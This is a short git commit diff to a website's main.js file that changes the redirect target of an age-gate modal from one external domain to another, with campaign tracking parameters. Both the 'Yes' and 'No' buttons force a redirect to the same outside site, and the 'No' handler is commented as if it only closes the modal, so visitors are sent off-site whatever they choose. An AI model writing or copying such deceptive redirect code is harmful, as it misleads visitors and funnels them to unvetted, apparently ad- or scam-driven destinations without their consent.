d97f47a99a7fc6bd9aa3d038fe03eede7f82d277
wild-cag-us <baaje112dd@gmail.com>
2026-03-26 15:06:33 +0530

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -82,12 +82,12 @@ if(form){
   function closeGate(){ bd.style.display='none'; bd.remove(); }  
   // ✅ Redirect when "Yes" is clicked
   bd.querySelector('#age-yes').addEventListener('click', function(){
-    window.location.href = "http://garrix.site/?utm_campaign=1FnWw0NvsU&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://p8r9.com/?utm_campaign=8I4jG9Zuim&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
  
   // ✅ Just close modal when "No" is clicked
   bd.querySelector('#age-no').addEventListener('click', function(){
-    window.location.href = "http://garrix.site/?utm_campaign=1FnWw0NvsU&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://p8r9.com/?utm_campaign=8I4jG9Zuim&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
 })();
  
